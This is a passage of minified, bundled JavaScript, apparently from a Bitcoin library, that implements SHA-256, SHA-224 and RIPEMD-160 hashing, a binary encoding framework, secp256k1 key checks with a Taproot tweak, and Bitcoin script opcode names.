              blockLen: t,
              buffer: n,
              length: r,
              finished: i,
              destroyed: o,
              pos: s,
            } = this;
            return (
              (e.length = r),
              (e.pos = s),
              (e.finished = i),
              (e.destroyed = o),
              r % t && e.buffer.set(n),
              e
            );
          }
        }
        const at = (e, t, n) => (e & t) ^ (e & n) ^ (t & n),
          lt = new Uint32Array([
            1116352408, 1899447441, 3049323471, 3921009573, 961987163,
            1508970993, 2453635748, 2870763221, 3624381080, 310598401,
            607225278, 1426881987, 1925078388, 2162078206, 2614888103,
            3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983,
            1249150122, 1555081692, 1996064986, 2554220882, 2821834349,
            2952996808, 3210313671, 3336571891, 3584528711, 113926993,
            338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700,
            1986661051, 2177026350, 2456956037, 2730485921, 2820302411,
            3259730800, 3345764771, 3516065817, 3600352804, 4094571909,
            275423344, 430227734, 506948616, 659060556, 883997877, 958139571,
            1322822218, 1537002063, 1747873779, 1955562222, 2024104815,
            2227730452, 2361852424, 2428436474, 2756734187, 3204031479,
            3329325298,
          ]),
          ct = new Uint32Array([
            1779033703, 3144134277, 1013904242, 2773480762, 1359893119,
            2600822924, 528734635, 1541459225,
          ]),
          ut = new Uint32Array(64);
        class ft extends st {
          constructor() {
            super(64, 32, 8, !1),
              (this.A = 0 | ct[0]),
              (this.B = 0 | ct[1]),
              (this.C = 0 | ct[2]),
              (this.D = 0 | ct[3]),
              (this.E = 0 | ct[4]),
              (this.F = 0 | ct[5]),
              (this.G = 0 | ct[6]),
              (this.H = 0 | ct[7]);
          }
          get() {
            const { A: e, B: t, C: n, D: r, E: i, F: o, G: s, H: a } = this;
            return [e, t, n, r, i, o, s, a];
          }
          set(e, t, n, r, i, o, s, a) {
            (this.A = 0 | e),
              (this.B = 0 | t),
              (this.C = 0 | n),
              (this.D = 0 | r),
              (this.E = 0 | i),
              (this.F = 0 | o),
              (this.G = 0 | s),
              (this.H = 0 | a);
          }
          process(e, t) {
            for (let f = 0; f < 16; f++, t += 4) ut[f] = e.getUint32(t, !1);
            for (let f = 16; f < 64; f++) {
              const e = ut[f - 15],
                t = ut[f - 2],
                n = nt(e, 7) ^ nt(e, 18) ^ (e >>> 3),
                r = nt(t, 17) ^ nt(t, 19) ^ (t >>> 10);
              ut[f] = (r + ut[f - 7] + n + ut[f - 16]) | 0;
            }
            let { A: n, B: r, C: i, D: o, E: s, F: a, G: l, H: c } = this;
            for (let f = 0; f < 64; f++) {
              const e =
                  (c +
                    (nt(s, 6) ^ nt(s, 11) ^ nt(s, 25)) +
                    (((u = s) & a) ^ (~u & l)) +
                    lt[f] +
                    ut[f]) |
                  0,
                t = ((nt(n, 2) ^ nt(n, 13) ^ nt(n, 22)) + at(n, r, i)) | 0;
              (c = l),
                (l = a),
                (a = s),
                (s = (o + e) | 0),
                (o = i),
                (i = r),
                (r = n),
                (n = (e + t) | 0);
            }
            var u;
            (n = (n + this.A) | 0),
              (r = (r + this.B) | 0),
              (i = (i + this.C) | 0),
              (o = (o + this.D) | 0),
              (s = (s + this.E) | 0),
              (a = (a + this.F) | 0),
              (l = (l + this.G) | 0),
              (c = (c + this.H) | 0),
              this.set(n, r, i, o, s, a, l, c);
          }
          roundClean() {
            ut.fill(0);
          }
          destroy() {
            this.set(0, 0, 0, 0, 0, 0, 0, 0), this.buffer.fill(0);
          }
        }
        class ht extends ft {
          constructor() {
            super(),
              (this.A = -1056596264),
              (this.B = 914150663),
              (this.C = 812702999),
              (this.D = -150054599),
              (this.E = -4191439),
              (this.F = 1750603025),
              (this.G = 1694076839),
              (this.H = -1090891868),
              (this.outputLen = 28);
          }
        }
        const dt = ot(() => new ft()),
          pt =
            (ot(() => new ht()),
            new Uint8Array([
              7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8,
            ])),
          gt = Uint8Array.from({ length: 16 }, (e, t) => t),
          yt = gt.map((e) => (9 * e + 5) % 16);
        let wt = [gt],
          mt = [yt];
        for (let Qr = 0; Qr < 4; Qr++)
          for (let e of [wt, mt]) e.push(e[Qr].map((e) => pt[e]));
        const bt = [
            [11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8],
            [12, 13, 11, 15, 6, 9, 9, 7, 12, 15, 11, 13, 7, 8, 7, 7],
            [13, 15, 14, 11, 7, 7, 6, 8, 13, 14, 13, 12, 5, 5, 6, 9],
            [14, 11, 12, 14, 8, 6, 5, 5, 15, 12, 15, 14, 9, 9, 8, 6],
            [15, 12, 13, 13, 9, 5, 8, 6, 14, 11, 12, 11, 8, 6, 5, 5],
          ].map((e) => new Uint8Array(e)),
          vt = wt.map((e, t) => e.map((e) => bt[t][e])),
          Et = mt.map((e, t) => e.map((e) => bt[t][e])),
          St = new Uint32Array([
            0, 1518500249, 1859775393, 2400959708, 2840853838,
          ]),
          xt = new Uint32Array([
            1352829926, 1548603684, 1836072691, 2053994217, 0,
          ]),
          At = (e, t) => (e << t) | (e >>> (32 - t));
        function kt(e, t, n, r) {
          return 0 === e
            ? t ^ n ^ r
            : 1 === e
            ? (t & n) | (~t & r)
            : 2 === e
            ? (t | ~n) ^ r
            : 3 === e
            ? (t & r) | (n & ~r)
            : t ^ (n | ~r);
        }
        const Tt = new Uint32Array(16);
        class Ct extends st {
          constructor() {
            super(64, 20, 8, !0),
              (this.h0 = 1732584193),
              (this.h1 = -271733879),
              (this.h2 = -1732584194),
              (this.h3 = 271733878),
              (this.h4 = -1009589776);
          }
          get() {
            const { h0: e, h1: t, h2: n, h3: r, h4: i } = this;
            return [e, t, n, r, i];
          }
          set(e, t, n, r, i) {
            (this.h0 = 0 | e),
              (this.h1 = 0 | t),
              (this.h2 = 0 | n),
              (this.h3 = 0 | r),
              (this.h4 = 0 | i);
          }
          process(e, t) {
            for (let h = 0; h < 16; h++, t += 4) Tt[h] = e.getUint32(t, !0);
            let n = 0 | this.h0,
              r = n,
              i = 0 | this.h1,
              o = i,
              s = 0 | this.h2,
              a = s,
              l = 0 | this.h3,
              c = l,
              u = 0 | this.h4,
              f = u;
            for (let h = 0; h < 5; h++) {
              const e = 4 - h,
                t = St[h],
                d = xt[h],
                p = wt[h],
                g = mt[h],
                y = vt[h],
                w = Et[h];
              for (let r = 0; r < 16; r++) {
                const e = (At(n + kt(h, i, s, l) + Tt[p[r]] + t, y[r]) + u) | 0;
                (n = u), (u = l), (l = 0 | At(s, 10)), (s = i), (i = e);
              }
              for (let n = 0; n < 16; n++) {
                const t = (At(r + kt(e, o, a, c) + Tt[g[n]] + d, w[n]) + f) | 0;
                (r = f), (f = c), (c = 0 | At(a, 10)), (a = o), (o = t);
              }
            }
            this.set(
              (this.h1 + s + c) | 0,
              (this.h2 + l + f) | 0,
              (this.h3 + u + r) | 0,
              (this.h4 + n + o) | 0,
              (this.h0 + i + a) | 0
            );
          }
          roundClean() {
            Tt.fill(0);
          }
          destroy() {
            (this.destroyed = !0), this.buffer.fill(0), this.set(0, 0, 0, 0, 0);
          }
        }
        const It = ot(() => new Ct());
        var Ot = n(5123);
        const Bt = new Uint8Array(),
          Pt = new Uint8Array([0]);
        function _t(e, t) {
          if (e.length !== t.length) return !1;
          for (let n = 0; n < e.length; n++) if (e[n] !== t[n]) return !1;
          return !0;
        }
        function Ut() {
          for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
            t[n] = arguments[n];
          if (1 === t.length) return t[0];
          const r = t.reduce((e, t) => e + t.length, 0),
            i = new Uint8Array(r);
          for (let o = 0, s = 0; o < t.length; o++) {
            const e = t[o];
            i.set(e, s), (s += e.length);
          }
          return i;
        }
        const Nt = (e) => e instanceof Uint8Array;
        class Rt {
          constructor(e) {
            let t =
                arguments.length > 1 && void 0 !== arguments[1]
                  ? arguments[1]
                  : [],
              n =
                arguments.length > 2 && void 0 !== arguments[2]
                  ? arguments[2]
                  : [];
            (this.data = e),
              (this.path = t),
              (this.fieldPath = n),
              (this.pos = 0),
              (this.hasPtr = !1),
              (this.bitBuf = 0),
              (this.bitPos = 0);
          }
          err(e) {
            return new Error(`Reader(${this.fieldPath.join("/")}): ${e}`);
          }
          absBytes(e) {
            if (e > this.data.length)
              throw new Error("absBytes: Unexpected end of buffer");
            return this.data.subarray(e);
          }
          bytes(e) {
            let t =
              arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
            if (this.bitPos) throw this.err("readBytes: bitPos not empty");
            if (!Number.isFinite(e))
              throw this.err(`readBytes: wrong length=${e}`);
            if (this.pos + e > this.data.length)
              throw this.err("readBytes: Unexpected end of buffer");
            const n = this.data.subarray(this.pos, this.pos + e);
            return t || (this.pos += e), n;
          }
          byte() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            if (this.bitPos) throw this.err("readByte: bitPos not empty");
            return this.data[e ? this.pos : this.pos++];
          }
          get leftBytes() {
            return this.data.length - this.pos;
          }
          isEnd() {
            return this.pos >= this.data.length && !this.bitPos;
          }
          length(e) {
            let t;
            if (
              (Ft(e)
                ? (t = Number(e.decodeStream(this)))
                : "number" === typeof e
                ? (t = e)
                : "string" === typeof e && (t = Mt(this.path, e.split("/"))),
              "bigint" === typeof t && (t = Number(t)),
              "number" !== typeof t)
            )
              throw this.err(`Wrong length: ${t}`);
            return t;
          }
          bits(e) {
            if (e > 32)
              throw this.err(
                "BitReader: cannot read more than 32 bits in single call"
              );
            let t = 0;
            for (; e; ) {
              this.bitPos ||
                ((this.bitBuf = this.data[this.pos++]), (this.bitPos = 8));
              const n = Math.min(e, this.bitPos);
              (this.bitPos -= n),
                (t = (t << n) | ((this.bitBuf >> this.bitPos) & (2 ** n - 1))),
                (this.bitBuf &= 2 ** this.bitPos - 1),
                (e -= n);
            }
            return t >>> 0;
          }
          find(e) {
            let t =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : this.pos;
            if (!Nt(e)) throw this.err(`find: needle is not bytes! ${e}`);
            if (this.bitPos) throw this.err("findByte: bitPos not empty");
            if (!e.length) throw this.err("find: needle is empty");
            for (let n = t; -1 !== (n = this.data.indexOf(e[0], n)); n++) {
              if (-1 === n) return;
              if (this.data.length - n < e.length) return;
              if (_t(e, this.data.subarray(n, n + e.length))) return n;
            }
          }
          finish() {
            if (!this.isEnd() && !this.hasPtr)
              throw this.err(
                `${this.leftBytes} bytes ${
                  this.bitPos
                } bits left after unpack: ${Ot.$v.encode(
                  this.data.slice(this.pos)
                )}`
              );
          }
          fieldPathPush(e) {
            this.fieldPath.push(e);
          }
          fieldPathPop() {
            this.fieldPath.pop();
          }
        }
        class Lt {
          constructor() {
            let e =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : [],
              t =
                arguments.length > 1 && void 0 !== arguments[1]
                  ? arguments[1]
                  : [];
            (this.path = e),
              (this.fieldPath = t),
              (this.buffers = []),
              (this.pos = 0),
              (this.ptrs = []),
              (this.bitBuf = 0),
              (this.bitPos = 0);
          }
          err(e) {
            return new Error(`Writer(${this.fieldPath.join("/")}): ${e}`);
          }
          bytes(e) {
            if (this.bitPos)
              throw this.err("writeBytes: ends with non-empty bit buffer");
            this.buffers.push(e), (this.pos += e.length);
          }
          byte(e) {
            if (this.bitPos)
              throw this.err("writeByte: ends with non-empty bit buffer");
            this.buffers.push(new Uint8Array([e])), this.pos++;
          }
          get buffer() {
            if (this.bitPos)
              throw this.err("buffer: ends with non-empty bit buffer");
            let e = Ut(...this.buffers);
            for (let t of this.ptrs) {
              const n = e.length;
              e = Ut(e, t.buffer);
              const r = t.ptr.encode(n);
              for (let i = 0; i < r.length; i++) e[t.pos + i] = r[i];
            }
            return e;
          }
          length(e, t) {
            if (null === e) return;
            if (Ft(e)) return e.encodeStream(this, t);
            let n;
            if (
              ("number" === typeof e
                ? (n = e)
                : "string" === typeof e && (n = Mt(this.path, e.split("/"))),
              "bigint" === typeof n && (n = Number(n)),
              void 0 === n || n !== t)
            )
              throw this.err(`Wrong length: ${n} len=${e} exp=${t}`);
          }
          bits(e, t) {
            if (t > 32)
              throw this.err(
                "writeBits: cannot write more than 32 bits in single call"
              );
            if (e >= 2 ** t)
              throw this.err(`writeBits: value (${e}) >= 2**bits (${t})`);
            for (; t; ) {
              const n = Math.min(t, 8 - this.bitPos);
              (this.bitBuf = (this.bitBuf << n) | (e >> (t - n))),
                (this.bitPos += n),
                (e &= 2 ** (t -= n) - 1),
                8 === this.bitPos &&
                  ((this.bitPos = 0),
                  this.buffers.push(new Uint8Array([this.bitBuf])),
                  this.pos++);
            }
          }
          fieldPathPush(e) {
            this.fieldPath.push(e);
          }
          fieldPathPop() {
            this.fieldPath.pop();
          }
        }
        const $t = (e) => Uint8Array.from(e).reverse();
        function Ht(e, t, n, r) {
          if (r) {
            const r = 2n ** (n - 1n);
            if (t < -r || t >= r) throw e.err("sInt: value out of bounds");
          } else if (0n > t || t >= 2n ** n)
            throw e.err("uInt: value out of bounds");
        }
        function Dt(e) {
          return {
            ...e,
            encode: (t) => {
              const n = new Lt();
              return e.encodeStream(n, t), n.buffer;
            },
            decode: (t) => {
              const n = new Rt(t),
                r = e.decodeStream(n);
              return n.finish(), r;
            },
          };
        }
        function Mt(e, t) {
          e = Array.from(e);
          let n = 0;
          for (; n < t.length && ".." === t[n]; n++) e.pop();
          let r = e.pop();
          for (; n < t.length; n++) {
            if (!r || void 0 === r[t[n]]) return;
            r = r[t[n]];
          }
          return r;
        }
        function Ft(e) {
          return (
            "function" === typeof e.encode &&
            "function" === typeof e.encodeStream &&
            "function" === typeof e.decode &&
            "function" === typeof e.decodeStream
          );
        }
        const jt = {
            dict: function () {
              return {
                encode: (e) => {
                  const t = {};
                  for (const [n, r] of e) {
                    if (void 0 !== t[n])
                      throw new Error(
                        `coders.dict: same key(${n}) appears twice in struct`
                      );
                    t[n] = r;
                  }
                  return t;
                },
                decode: (e) => Object.entries(e),
              };
            },
            number: {
              encode: (e) => {
                if (e > BigInt(Number.MAX_SAFE_INTEGER))
                  throw new Error(
                    `coders.number: element bigger than MAX_SAFE_INTEGER=${e}`
                  );
                return Number(e);
              },
              decode: (e) => BigInt(e),
            },
            tsEnum: function (e) {
              return { encode: (t) => e[t], decode: (t) => e[t] };
            },
            decimal: function (e) {
              const t = 10n ** BigInt(e);
              return {
                encode: (t) => {
                  let n = (t < 0n ? -t : t).toString(10),
                    r = n.length - e;
                  r < 0 && ((n = n.padStart(n.length - r, "0")), (r = 0));
                  let i = n.length - 1;
                  for (; i >= r && "0" === n[i]; i--);
                  let [o, s] = [n.slice(0, r), n.slice(r, i + 1)];
                  return (
                    o || (o = "0"), t < 0n && (o = "-" + o), s ? `${o}.${s}` : o
                  );
                },
                decode: (n) => {
                  let r = !1;
                  n.startsWith("-") && ((r = !0), (n = n.slice(1)));
                  let i = n.indexOf(".");
                  i = -1 === i ? n.length : i;
                  const [o, s] = [n.slice(0, i), n.slice(i + 1)],
                    a = BigInt(o) * t,
                    l = Math.min(s.length, e),
                    c = a + BigInt(s.slice(0, l)) * 10n ** BigInt(e - l);
                  return r ? -c : c;
                },
              };
            },
            match: function (e) {
              return {
                encode: (t) => {
                  for (const n of e) {
                    const e = n.encode(t);
                    if (void 0 !== e) return e;
                  }
                  throw new Error(`match/encode: cannot find match in ${t}`);
                },
                decode: (t) => {
                  for (const n of e) {
                    const e = n.decode(t);
                    if (void 0 !== e) return e;
                  }
                  throw new Error(`match/decode: cannot find match in ${t}`);
                },
              };
            },
          },
          zt = function (e) {
            let t =
                arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
              n =
                arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
            return Dt({
              size: e,
              encodeStream: (r, i) => {
                if ("number" !== typeof i && "bigint" !== typeof i)
                  throw r.err(`bigint: invalid value: ${i}`);
                let o = BigInt(i);
                const s = BigInt(e);
                Ht(r, o, 8n * s, !!n);
                n && o < 0 && (o |= 2n ** (8n * s - 1n));
                let a = [];
                for (let t = 0; t < e; t++)
                  a.push(Number(255n & o)), (o >>= 8n);
                let l = new Uint8Array(a).reverse();
                r.bytes(t ? l.reverse() : l);
              },
              decodeStream: (r) => {
                const i = BigInt(e);
                let o = r.bytes(e);
                t && (o = $t(o));
                const s = $t(o),
                  a = 2n ** (8n * i - 1n);
                let l = 0n;
                for (let e = 0; e < s.length; e++)
                  l |= BigInt(s[e]) << (8n * BigInt(e));
                return (
                  n && l & a && (l = (l ^ a) - a), Ht(r, l, 8n * i, !!n), l
                );
              },
            });
          },
          Kt = (zt(32, !0), zt(32, !1)),
          Wt =
            (zt(32, !0, !0),
            zt(32, !1, !0),
            zt(16, !0),
            zt(16, !1),
            zt(16, !0, !0),
            zt(16, !1, !0),
            zt(8, !0)),
          Vt = (zt(8, !1), zt(8, !0, !0)),
          qt =
            (zt(8, !1, !0),
            function (e) {
              let t =
                  arguments.length > 1 &&
                  void 0 !== arguments[1] &&
                  arguments[1],
                n =
                  arguments.length > 2 &&
                  void 0 !== arguments[2] &&
                  arguments[2];
              if (e > 6)
                throw new Error(
                  "int supports size up to 6 bytes (48 bits), for other use bigint"
                );
              return tn(zt(e, t, n), jt.number);
            }),
          Gt = qt(4, !0),
          Yt = qt(4, !1),
          Zt = qt(4, !0, !0),
          Jt = (qt(4, !1, !0), qt(2, !0)),
          Xt = (qt(2, !1), qt(2, !0, !0), qt(2, !1, !0), qt(1, !1)),
          Qt =
            (qt(1, !1, !0),
            Dt({
              size: 1,
              encodeStream: (e, t) => e.byte(t ? 1 : 0),
              decodeStream: (e) => {
                const t = e.byte();
                if (0 !== t && 1 !== t) throw e.err(`bool: invalid value ${t}`);
                return 1 === t;
              },
            }),
            function (e) {
              let t =
                arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
              return Dt({
                size: "number" === typeof e ? e : void 0,
                encodeStream: (n, r) => {
                  if (!Nt(r)) throw n.err(`bytes: invalid value ${r}`);
                  Nt(e) || n.length(e, r.length),
                    n.bytes(t ? $t(r) : r),
                    Nt(e) && n.bytes(e);
                },
                decodeStream: (n) => {
                  let r;
                  if (Nt(e)) {
                    const t = n.find(e);
                    if (!t) throw n.err("bytes: cannot find terminator");
                    (r = n.bytes(t - n.pos)), n.bytes(e.length);
                  } else r = n.bytes(null === e ? n.leftBytes : n.length(e));
                  return t ? $t(r) : r;
                },
              });
            }),
          en = function (e) {
            const t = Qt(
              e,
              arguments.length > 1 && void 0 !== arguments[1] && arguments[1]
            );
            return Dt({
              size: t.size,
              encodeStream: (e, n) => t.encodeStream(e, Ot.KA.decode(n)),
              decodeStream: (e) => Ot.KA.encode(t.decodeStream(e)),
            });
          };
        en(Pt);
        function tn(e, t) {
          if (!Ft(e)) throw new Error(`apply: invalid inner value ${e}`);
          return Dt({
            size: e.size,
            encodeStream: (n, r) => {
              let i;
              try {
                i = t.decode(r);
              } catch (o) {
                throw n.err("" + o);
              }
              return e.encodeStream(n, i);
            },
            decodeStream: (n) => {
              const r = e.decodeStream(n);
              try {
                return t.encode(r);
              } catch (i) {
                throw n.err("" + i);
              }
            },
          });
        }
        function nn(e, t) {
          if (!Ft(e)) throw new Error(`validate: invalid inner value ${e}`);
          return Dt({
            size: e.size,
            encodeStream: (n, r) => e.encodeStream(n, t(r)),
            decodeStream: (n) => t(e.decodeStream(n)),
          });
        }
        function rn(e, t) {
          let n =
            !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
          if (!Ft(e)) throw new Error(`flagged: invalid inner value ${e}`);
          return Dt({
            size: e.size,
            encodeStream: (n, r) => e.encodeStream(n, t),
            decodeStream: (r) => {
              const i = e.decodeStream(r);
              if (
                (n && "object" !== typeof i && i !== t) ||
                (Nt(t) && !_t(t, i))
              )
                throw r.err(`magic: invalid value: ${i} !== ${t}`);
            },
          });
        }
        function on(e) {
          let t = 0;
          for (let n of e) {
            if (!n.size) return;
            t += n.size;
          }
          return t;
        }
        function sn(e) {
          if (Array.isArray(e))
            throw new Error("Packed.Struct: got array instead of object");
          return Dt({
            size: on(Object.values(e)),
            encodeStream: (t, n) => {
              if ("object" !== typeof n || null === n)
                throw t.err(`struct: invalid value ${n}`);
              t.path.push(n);
              for (let r in e) {
                t.fieldPathPush(r),
                  e[r].encodeStream(t, n[r]),
                  t.fieldPathPop();
              }
              t.path.pop();
            },
            decodeStream: (t) => {
              let n = {};
              t.path.push(n);
              for (let r in e)
                t.fieldPathPush(r),
                  (n[r] = e[r].decodeStream(t)),
                  t.fieldPathPop();
              return t.path.pop(), n;
            },
          });
        }
        function an(e, t) {
          if (!Ft(t)) throw new Error(`array: invalid inner value ${t}`);
          return Dt({
            size: "number" === typeof e && t.size ? e * t.size : void 0,
            encodeStream: (n, r) => {
              if (!Array.isArray(r)) throw n.err(`array: invalid value ${r}`);
              Nt(e) || n.length(e, r.length), n.path.push(r);
              for (let i = 0; i < r.length; i++) {
                n.fieldPathPush("" + i);
                const o = r[i],
                  s = n.pos;
                if ((t.encodeStream(n, o), Nt(e))) {
                  if (e.length > n.pos - s) continue;
                  const t = n.buffer.subarray(s, n.pos);
                  if (_t(t.subarray(0, e.length), e))
                    throw n.err(
                      `array: inner element encoding same as separator. elm=${o} data=${t}`
                    );
                }
                n.fieldPathPop();
              }
              n.path.pop(), Nt(e) && n.bytes(e);
            },
            decodeStream: (n) => {
              let r = [];
              if (null === e) {
                let e = 0;
                for (
                  n.path.push(r);
                  !n.isEnd() &&
                  (n.fieldPathPush("" + e++),
                  r.push(t.decodeStream(n)),
                  n.fieldPathPop(),
                  !(t.size && n.leftBytes < t.size));

                );
                n.path.pop();
              } else if (Nt(e)) {
                let i = 0;
                for (n.path.push(r); ; ) {
                  if (_t(n.bytes(e.length, !0), e)) {
                    n.bytes(e.length);
                    break;
                  }
                  n.fieldPathPush("" + i++),
                    r.push(t.decodeStream(n)),
                    n.fieldPathPop();
                }
                n.path.pop();
              } else {
                n.fieldPathPush("arrayLen");
                const i = n.length(e);
                n.fieldPathPop(), n.path.push(r);
                for (let e = 0; e < i; e++)
                  n.fieldPathPush("" + e),
                    r.push(t.decodeStream(n)),
                    n.fieldPathPop();
                n.path.pop();
              }
              return r;
            },
          });
        }
        rn(Qt(0), Bt);
        const { ProjectivePoint: ln, sign: cn, getPublicKey: un } = Be,
          fn = Be.CURVE.n,
          hn = (e, t) => (void 0 === e ? t : e),
          dn = (e) => e instanceof Uint8Array,
          pn = (e) => It(dt(e)),
          gn = function () {
            return dt(dt(yn(...arguments)));
          },
          yn = Ut,
          wn = (0, Ot.Av)(dt);
        var mn;
        function bn(e, t) {
          const n = e.length;
          if (t === mn.ecdsa) {
            if (32 === n) throw new Error("Expected non-Schnorr key");
            return ln.fromHex(e), e;
          }
          if (t === mn.schnorr) {
            if (32 !== n) throw new Error("Expected 32-byte Schnorr key");
            return Ve.utils.lift_x(Ve.utils.bytesToNumberBE(e)), e;
          }
          throw new Error("Unknown key type");
        }
        function vn(e, t) {
          try {
            return bn(e, t), !0;
          } catch (n) {
            return !1;
          }
        }
        !(function (e) {
          (e[(e.ecdsa = 0)] = "ecdsa"), (e[(e.schnorr = 1)] = "schnorr");
        })(mn || (mn = {}));
        const En = (e) => e.r < fn / 2n;
        function Sn(e, t) {
          const n = Ve.utils,
            r = n.taggedHash("TapTweak", e, t),
            i = n.bytesToNumberBE(r);
          if (i >= fn) throw new Error("tweak higher than curve order");
          return i;
        }
        function xn(e, t) {
          const n = Ve.utils,
            r = Sn(e, t),
            i = n.lift_x(n.bytesToNumberBE(e)).add(ln.fromPrivateKey(r)),
            o = i.hasEvenY() ? 0 : 1;
          return [n.pointToBytes(i), o];
        }
        const An = nn(Qt(null), (e) => bn(e, mn.ecdsa)),
          kn = nn(Qt(32), (e) => bn(e, mn.schnorr)),
          Tn = nn(Qt(null), (e) => {
            if (64 !== e.length && 65 !== e.length)
              throw new Error(
                "Schnorr signature should be 64 or 65 bytes long"
              );
            return e;
          });
        const Cn = { bech32: "bc", pubKeyHash: 0, scriptHash: 5, wif: 128 },
          In = 4294967295,
          On = new Uint8Array(32);
        jt.decimal(8);
        function Bn(e, t) {
          if (!dn(e) || !dn(t))
            throw new Error(`cmp: wrong type a=${typeof e} b=${typeof t}`);
          const n = Math.min(e.length, t.length);
          for (let r = 0; r < n; r++)
            if (e[r] != t[r]) return Math.sign(e[r] - t[r]);
          return Math.sign(e.length - t.length);
        }
        var Pn;
        !(function (e) {
          (e[(e.OP_0 = 0)] = "OP_0"),
            (e[(e.PUSHDATA1 = 76)] = "PUSHDATA1"),
            (e[(e.PUSHDATA2 = 77)] = "PUSHDATA2"),
            (e[(e.PUSHDATA4 = 78)] = "PUSHDATA4"),
            (e[(e["1NEGATE"] = 79)] = "1NEGATE"),
            (e[(e.RESERVED = 80)] = "RESERVED"),
            (e[(e.OP_1 = 81)] = "OP_1"),
            (e[(e.OP_2 = 82)] = "OP_2"),
            (e[(e.OP_3 = 83)] = "OP_3"),
            (e[(e.OP_4 = 84)] = "OP_4"),
            (e[(e.OP_5 = 85)] = "OP_5"),
            (e[(e.OP_6 = 86)] = "OP_6"),
            (e[(e.OP_7 = 87)] = "OP_7"),
            (e[(e.OP_8 = 88)] = "OP_8"),
            (e[(e.OP_9 = 89)] = "OP_9"),
            (e[(e.OP_10 = 90)] = "OP_10"),
            (e[(e.OP_11 = 91)] = "OP_11"),
            (e[(e.OP_12 = 92)] = "OP_12"),
            (e[(e.OP_13 = 93)] = "OP_13"),
            (e[(e.OP_14 = 94)] = "OP_14"),
            (e[(e.OP_15 = 95)] = "OP_15"),
            (e[(e.OP_16 = 96)] = "OP_16"),
            (e[(e.NOP = 97)] = "NOP"),
            (e[(e.VER = 98)] = "VER"),
            (e[(e.IF = 99)] = "IF"),
            (e[(e.NOTIF = 100)] = "NOTIF"),
            (e[(e.VERIF = 101)] = "VERIF"),
            (e[(e.VERNOTIF = 102)] = "VERNOTIF"),
            (e[(e.ELSE = 103)] = "ELSE"),
            (e[(e.ENDIF = 104)] = "ENDIF"),
            (e[(e.VERIFY = 105)] = "VERIFY"),
            (e[(e.RETURN = 106)] = "RETURN"),
            (e[(e.TOALTSTACK = 107)] = "TOALTSTACK"),
            (e[(e.FROMALTSTACK = 108)] = "FROMALTSTACK"),
            (e[(e["2DROP"] = 109)] = "2DROP"),
            (e[(e["2DUP"] = 110)] = "2DUP"),
            (e[(e["3DUP"] = 111)] = "3DUP"),
            (e[(e["2OVER"] = 112)] = "2OVER"),
            (e[(e["2ROT"] = 113)] = "2ROT"),
            (e[(e["2SWAP"] = 114)] = "2SWAP"),
            (e[(e.IFDUP = 115)] = "IFDUP"),
            (e[(e.DEPTH = 116)] = "DEPTH"),
            (e[(e.DROP = 117)] = "DROP"),
            (e[(e.DUP = 118)] = "DUP"),
            (e[(e.NIP = 119)] = "NIP"),
            (e[(e.OVER = 120)] = "OVER"),
            (e[(e.PICK = 121)] = "PICK"),
            (e[(e.ROLL = 122)] = "ROLL"),
            (e[(e.ROT = 123)] = "ROT"),
            (e[(e.SWAP = 124)] = "SWAP"),
            (e[(e.TUCK = 125)] = "TUCK"),
            (e[(e.CAT = 126)] = "CAT"),
            (e[(e.SUBSTR = 127)] = "SUBSTR"),
            (e[(e.LEFT = 128)] = "LEFT"),
            (e[(e.RIGHT = 129)] = "RIGHT"),
            (e[(e.SIZE = 130)] = "SIZE"),
            (e[(e.INVERT = 131)] = "INVERT"),
            (e[(e.AND = 132)] = "AND"),
            (e[(e.OR = 133)] = "OR"),
            (e[(e.XOR = 134)] = "XOR"),
            (e[(e.EQUAL = 135)] = "EQUAL"),
            (e[(e.EQUALVERIFY = 136)] = "EQUALVERIFY"),
            (e[(e.RESERVED1 = 137)] = "RESERVED1"),
            (e[(e.RESERVED2 = 138)] = "RESERVED2"),
            (e[(e["1ADD"] = 139)] = "1ADD"),
            (e[(e["1SUB"] = 140)] = "1SUB"),
            (e[(e["2MUL"] = 141)] = "2MUL"),
            (e[(e["2DIV"] = 142)] = "2DIV"),
            (e[(e.NEGATE = 143)] = "NEGATE"),
            (e[(e.ABS = 144)] = "ABS"),
            (e[(e.NOT = 145)] = "NOT"),
            (e[(e["0NOTEQUAL"] = 146)] = "0NOTEQUAL"),
            (e[(e.ADD = 147)] = "ADD"),
            (e[(e.SUB = 148)] = "SUB"),
            (e[(e.MUL = 149)] = "MUL"),
            (e[(e.DIV = 150)] = "DIV"),
            (e[(e.MOD = 151)] = "MOD"),
            (e[(e.LSHIFT = 152)] = "LSHIFT"),
            (e[(e.RSHIFT = 153)] = "RSHIFT"),
            (e[(e.BOOLAND = 154)] = "BOOLAND"),
            (e[(e.BOOLOR = 155)] = "BOOLOR"),
            (e[(e.NUMEQUAL = 156)] = "NUMEQUAL"),
            (e[(e.NUMEQUALVERIFY = 157)] = "NUMEQUALVERIFY"),
            (e[(e.NUMNOTEQUAL = 158)] = "NUMNOTEQUAL"),
            (e[(e.LESSTHAN = 159)] = "LESSTHAN"),
            (e[(e.GREATERTHAN = 160)] = "GREATERTHAN"),
            (e[(e.LESSTHANOREQUAL = 161)] = "LESSTHANOREQUAL"),
            (e[(e.GREATERTHANOREQUAL = 162)] = "GREATERTHANOREQUAL"),
            (e[(e.MIN = 163)] = "MIN"),
            (e[(e.MAX = 164)] = "MAX"),
            (e[(e.WITHIN = 165)] = "WITHIN"),
            (e[(e.RIPEMD160 = 166)] = "RIPEMD160"),
            (e[(e.SHA1 = 167)] = "SHA1"),
            (e[(e.SHA256 = 168)] = "SHA256"),
            (e[(e.HASH160 = 169)] = "HASH160"),
            (e[(e.HASH256 = 170)] = "HASH256"),
            (e[(e.CODESEPARATOR = 171)] = "CODESEPARATOR"),
            (e[(e.CHECKSIG = 172)] = "CHECKSIG"),
